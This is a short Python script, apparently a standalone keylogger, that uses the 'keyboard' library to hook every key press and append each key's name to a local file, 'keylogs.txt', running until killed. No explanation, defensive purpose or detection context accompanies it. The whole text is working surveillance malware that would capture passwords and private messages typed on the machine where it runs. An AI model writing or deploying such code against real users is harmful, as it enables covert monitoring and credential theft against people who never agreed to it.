import keyboard

log_file = "keylogs.txt"

def keylogger(event):
    with open(log_file, 'a') as f:
        f.write('{}\n'.format(event.name))
        
keyboard.on_press(keylogger)
keyboard.wait()